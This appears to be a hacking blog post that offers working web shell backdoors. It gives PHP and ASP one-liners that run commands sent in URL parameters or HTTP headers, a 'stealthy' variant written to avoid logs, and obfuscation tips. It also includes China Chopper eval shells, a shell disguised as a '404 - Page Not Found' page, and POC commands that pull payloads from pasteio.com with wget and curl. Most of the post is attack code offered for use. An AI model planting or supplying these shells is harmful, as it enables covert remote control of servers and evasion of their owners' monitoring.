---
layout: post
title: Encrypted Backdoor Secret Shell
date: 2022-08-01 14:42
author: theguler
comments: true
categories: [Hacking - Security]
---
<!-- wp:image {"id":3912,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://farukguler.com/assets/post_images/fox-1.png?w=849" alt="" class="wp-image-3912" /></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>A webshell is a shell that you can access through the web. This is useful for when you have firewalls that filter outgoing traffic on ports other than port 80. As long as you have a webserver, and want it to function, you can't filter our traffic on port 80 (and 443). It is also a bit more stealthy than a reverse shell on other ports since the traffic is hidden in the http traffic.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Caution: </strong>I found it appropriate to share it without encryption to show that there is no log hidden in the codes. But I recommend Encrypt.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>An example: China Chopper </strong>is a web shell approximately 4 kilobytes in size, first discovered in 2012. This web shell is commonly used by malicious Chinese actors, including advanced persistent threat (APT) groups, to remotely control web servers. This web shell has two parts, the client interface (an executable file) and the receiver host file on the compromised web server.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>&lt;PHP:</strong><br>#Execute one command<br><strong>&lt;?php system("ls -a"); ?&gt;</strong><br><strong>&lt;?php system("whoami"); ?&gt;</strong><br><br>#Take input from the url paramter. run as any shell commands.<br><strong>&lt;?php system($_GET['cmd']);?&gt;</strong><br><br>#The same but using passthru<br><strong>&lt;?php passthru($_GET['cmd']); ?&gt;</strong><br><br>#For shell_exec to output the result you need to echo it<br><strong>&lt;?php echo shell_exec("whoami");?&gt;</strong><br><br>#Exec() does not output the result without echo, and only output the last line. So not very useful!<br><strong>&lt;?php echo exec("whoami");?&gt;</strong><br><br>#Instead to this if you can. It will return the output as an array, and then print it all.<br><strong>&lt;?php exec("ls -la",$array); print_r($array); ?&gt;</strong><br><br>#preg_replace(). This is a cool trick<br><strong>&lt;?php preg_replace('/.*/e', 'system("whoami");', ''); ?&gt;</strong><br><br># Using backticks<br><strong>&lt;?php $output = `whoami`; echo "&lt;pre&gt;$output&lt;/pre&gt;"; ?&gt;</strong><br><br>#Using backticks<br><strong>&lt;?php echo `whoami`; ?&gt;</strong><br><br><strong>POC:</strong><br>http://192.168.1.103/fox.php?cmd=pwd<br>/index.php?cmd=wget https://pasteio.com/raw/bl8okgdd fox.php<br>/index.php?cmd=curl https://pasteio.com/raw/lkjfjfd &gt; fox.php <br>/index.php?cmd=GET https://pasteio.com/raw/erg44j fox.php<br><br><br><strong>Make it stealthy:</strong><br># We can make the commands from above a bit more stealthy. Instead of passing the cmds through the url, which will be obvious in logs, we cna pass them through other header-paramters.<br><br><strong>&lt;?php system($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?&gt;<br>&lt;?php system($_SERVER['HTTP_USER_AGENT'])?&gt;</strong><br><br># I have had to use this one<br><strong>&lt;?php echo passthru($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?&gt;</strong><br><br><strong>Obfuscation:</strong><br><strong>eval(): </strong>A function that evaluates a given string as PHP code<br><strong>assert(): </strong>A function that evaluates a given string as PHP code<br><strong>base64():</strong> Encodes data with MIME base64 encoding<br><strong>gzdeflate():</strong> Compresses a string using DEFLATE data format; gzinflate() decompresses it<br><strong>str_rot13():</strong> Shifts every letter of a given string 13 places in the alphabet<br><br><strong>&lt;ASP:</strong><br>&lt;%<br>Dim oS<br>On Error Resume Next<br>Set oS = Server.CreateObject("WSCRIPT.SHELL")<br>Call oS.Run("win.com cmd.exe /c c:\Inetpub\shell443.exe",0,True)<br>%&gt;<br><br><strong>China Chopper</strong>:<br>PHP: &lt;?php @eval($_POST[‘password’]);?&gt;<br>ASPX: &lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(RequestItem[“password”],”unsafe”);%&gt;</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p><strong>2 Basic PHP WebShell Frontend:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">#1<br>&lt;?php<br>if (isset($_GET['cmd'])) {<br>    $cmd = $_GET['cmd'];<br>    system($cmd);<br>} else {<br>    echo "404 - Page Not Found";<br>}<br>?&gt;<br><br>#2<br><strong>&lt;html&gt;<br>&lt;body&gt;<br>&lt;form method="GET" name="&lt;?php echo basename($_SERVER['PHP_SELF']); ?&gt;"&gt;<br>&lt;input type="TEXT" name="cmd" autofocus id="cmd" size="60"&gt;<br>&lt;input type="SUBMIT" value="Execute"&gt;<br>&lt;/form&gt;<br>&lt;pre&gt;<br>&lt;?php<br>    if(isset($_GET['cmd']))<br>    {<br>        system($_GET['cmd']);<br>    }<br>?&gt;<br>&lt;/pre&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;</strong></pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p><strong>Copyright 2017 WhiteWinterWolf</strong>  <strong>Shell Source Code</strong></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><a href="https://github.com/faruk-guler/Shell">https://github.com/faruk-guler/Shell</a></pre>
<!-- /wp:preformatted -->
